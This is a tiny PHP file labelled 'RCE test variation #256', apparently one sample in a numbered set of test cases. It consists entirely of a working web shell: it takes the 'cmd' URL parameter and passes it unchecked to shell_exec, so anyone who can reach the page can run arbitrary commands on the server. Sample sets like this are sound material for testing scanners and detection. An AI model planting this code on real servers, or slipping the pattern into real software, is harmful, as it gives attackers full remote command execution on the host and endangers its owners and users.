<?php
// RCE test variation #256
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>